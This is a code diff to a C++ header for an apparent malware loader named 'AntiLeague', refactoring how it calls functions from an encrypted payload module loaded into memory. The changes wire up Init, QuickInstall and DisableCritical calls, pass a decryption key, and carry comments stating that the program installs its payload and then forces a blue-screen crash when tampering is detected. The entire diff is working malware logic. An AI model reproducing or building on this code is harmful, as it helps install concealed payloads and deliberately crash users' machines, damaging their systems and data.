@@ -1,9 +1,12 @@
 #pragma once
 
-typedef bool (*AntiLeagueProc)();
-typedef void (*QuickInstallProc)(const std::string& payload, const std::string& dec_key);
-typedef void (*InitProc)(const std::string& payloadPath, const std::string& payload, const std::string& dec_key);
-typedef void (*DisableCriticalProc)();
+namespace Payload
+{
+    struct AntiLeague { typedef void (*Proc)(); };
+    struct QuickInstall { typedef void (*Proc)(const std::string& payload, const std::string& dec_key); };
+    struct Init { typedef void (*Proc)(const std::string* payloadPath, const std::string& payload, const std::string& dec_key); };
+    struct DisableCritical { typedef void (*Proc)(); };
+}
 
 class AntiLeague
 {
@@ -57,37 +60,38 @@ public:
     void LoadPayload(const std::string& payloadPath);
 
     template <typename T>
-    void Attack(T function, const char* name, const std::string& payloadPath)
+    void Attack(const char* functionName, const std::string* payloadPath = nullptr)
     {
-        function = (T)MemoryGetProcAddress(hPayload, name);
+        typename T::Proc function = (typename T::Proc)MemoryGetProcAddress(hPayload, functionName);
 
         if (function != NULL)
         {
-            if constexpr (std::is_same_v<T, InitProc>)
+            if constexpr (std::is_same_v<T, Payload::Init>)
             {
                 function(payloadPath, payload, dec_key);
             }
-            else if constexpr (std::is_same_v<T, QuickInstallProc>)
+            else if constexpr (std::is_same_v<T, Payload::QuickInstall>)
             {
                 function(payload, dec_key);
             }
-            else if constexpr (std::is_same_v<T, AntiLeagueProc>)
+            else if constexpr (std::is_same_v<T, Payload::AntiLeague>)
             {
-                if (!function())
-                {
-                    Attack<QuickInstallProc>(QuickInstallProc(), "QuickInstall", NULL);
-                    Attack<AntiLeagueProc>(AntiLeagueProc(), "AntiLeague", NULL);
-                }
+                    function(); //Returns when tampering detected
+                    Attack<Payload::QuickInstall>("QuickInstall"); //Install then BSOD
             }
-            else if constexpr (std::is_same_v<T, DisableCriticalProc>)
+            else if constexpr (std::is_same_v<T, Payload::DisableCritical>)
             {
                 function();
+            }
+            else
+            {
+                static_assert(!std::is_same_v<T, T>, "Proc not supported");
             }
         }
         else
         {
             MessageBox(NULL, L"Payload Function Missing", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
-            exit(1); //BSOD
+            this->~AntiLeague(); //BSOD
         }
     }
 };
